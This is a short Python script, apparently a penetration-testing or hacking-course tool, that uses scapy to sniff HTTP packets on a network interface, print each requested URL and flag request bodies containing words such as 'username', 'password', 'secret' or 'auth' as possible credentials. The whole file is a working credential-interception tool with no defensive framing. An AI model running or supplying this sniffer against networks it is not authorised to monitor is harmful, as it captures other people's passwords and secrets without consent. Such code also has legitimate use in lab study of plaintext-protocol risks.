#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http


class _Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processPacket)


def getUrl(packet):
    url = "http://{0}{1}".format(packet[http.HTTPRequest].Host.decode("utf-8"),
                                 packet[http.HTTPRequest].Path.decode("utf-8"))
    print(_Colors.OKCYAN + "[+] HTTP Request >>", url, _Colors.ENDC)
    return url


def loginInfo(packet):
    load = packet[scapy.Raw].load
    keywords = ["username", "user", "pass", "password", "secret", "auth", "key"]
    for word in keywords:
        if word in str(load.lower()):
            print(_Colors.OKGREEN + "[!] Possible credentials/secrets >>", load, _Colors.ENDC)
            return load


def processPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = getUrl(packet)
        if packet.haslayer(scapy.Raw):
            login_info = loginInfo(packet)


sniff("ens33")
